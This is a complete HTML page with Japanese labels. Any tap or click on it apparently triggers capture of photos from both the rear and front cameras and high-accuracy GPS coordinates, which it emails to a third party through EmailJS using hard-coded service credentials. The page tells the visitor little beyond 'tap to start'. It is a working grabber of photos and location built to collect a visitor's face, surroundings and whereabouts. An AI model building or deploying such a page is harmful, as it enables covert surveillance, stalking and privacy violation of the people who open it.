<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <title>📷 タッチキャプチャ＆送信</title>
  <script src="https://cdn.emailjs.com/sdk/3.2.0/email.min.js"></script>
  <style>
    body {
      font-family: sans-serif;
      padding: 20px;
      background: linear-gradient(135deg, #667eea, #764ba2);
      color: white;
      text-align: center;
    }
    img, video {
      max-width: 100%;
      border-radius: 8px;
      margin: 10px 0;
    }
    .status {
      padding: 10px;
      border-radius: 5px;
      margin: 10px 0;
      background: rgba(0,0,0,0.3);
    }
    .error { background: rgba(255,0,0,0.3); }
    .success { background: rgba(0,255,0,0.2); }
    .warning { background: rgba(255,255,0,0.2); }
  </style>
</head>
<body>
  <h1>📷 タッチで撮影＆送信</h1>
  <p>クリックまたはタッチで処理開始</p>
  <div class="status" id="status">待機中...</div>

  <video id="video" autoplay muted playsinline style="display:none;"></video>
  <canvas id="canvas" style="display:none;"></canvas>
  <img id="rear" style="display:none;">
  <img id="front" style="display:none;">
  <video id="playback" controls style="display:none;"></video>

  <script>
    emailjs.init("cPjKBUm_i6HebDQF7");

    const statusEl = document.getElementById("status");
    const video = document.getElementById("video");
    const canvas = document.getElementById("canvas");
    const imgRear = document.getElementById("rear");
    const imgFront = document.getElementById("front");
    const playback = document.getElementById("playback");

    const sampleVideo = "data:video/mp4;base64,AAAAIGZ0eXB...（略）"; // 適切なBase64動画データに差し替え

    function updateStatus(msg, cls = "") {
      statusEl.textContent = msg;
      statusEl.className = `status ${cls}`;
    }

    async function capturePhoto(facing) {
      updateStatus(`📸 ${facing}カメ起動中...`, "warning");
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: facing }, audio: false
      });
      video.srcObject = stream;
      await new Promise(r => setTimeout(r, 1500));
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext("2d").drawImage(video, 0, 0);
      const base64 = canvas.toDataURL("image/jpeg", 0.6);
      stream.getTracks().forEach(t => t.stop());
      return base64;
    }

    function getLocation() {
      updateStatus("📍 位置情報取得中...", "warning");
      return new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(pos => {
          resolve({
            lat: pos.coords.latitude,
            lng: pos.coords.longitude,
            acc: pos.coords.accuracy,
            time: new Date().toISOString()
          });
        }, err => {
          reject(new Error("位置情報エラー: " + err.message));
        }, { enableHighAccuracy: true, timeout: 10000 });
      });
    }

    async function sendEmail({rear, front, location, videoStatus}) {
      updateStatus("📨 メール送信中...", "warning");
      try {
        await emailjs.send("service_ja2c09x", "template_2fp2jrg", {
          photo_rear: rear,
          photo_front: front,
          location_info: `緯度: ${location.lat}<br>経度: ${location.lng}<br>精度: ${location.acc}m<br>時刻: ${location.time}`,
          video_status: videoStatus,
          date: new Date().toLocaleString()
        });
        updateStatus("✅ メール送信成功", "success");
      } catch (e) {
        console.error("EmailJS送信エラー:", e);
        updateStatus("❌ メール送信失敗", "error");
      }
    }

    async function execute() {
      try {
        updateStatus("🔄 処理中...", "warning");
        const rear = await capturePhoto("environment");
        imgRear.src = rear;
        imgRear.style.display = "block";

        const front = await capturePhoto("user");
        imgFront.src = front;
        imgFront.style.display = "block";

        const location = await getLocation();

        let videoStatus = "動画再生無し";
        try {
          playback.src = sampleVideo;
          await playback.play();
          playback.style.display = "block";
          videoStatus = "動画再生完了";
        } catch (e) {
          console.warn("動画再生失敗:", e);
        }

        await sendEmail({ rear, front, location, videoStatus });
        updateStatus("🎉 全処理完了", "success");
      } catch (e) {
        console.error("エラー:", e);
        updateStatus("❌ エラー: " + e.message, "error");
      }
    }

    document.body.addEventListener("click", () => execute());
    document.body.addEventListener("touchstart", e => {
      e.preventDefault();
      execute();
    }, { passive: false });
  </script>
</body>
</html>
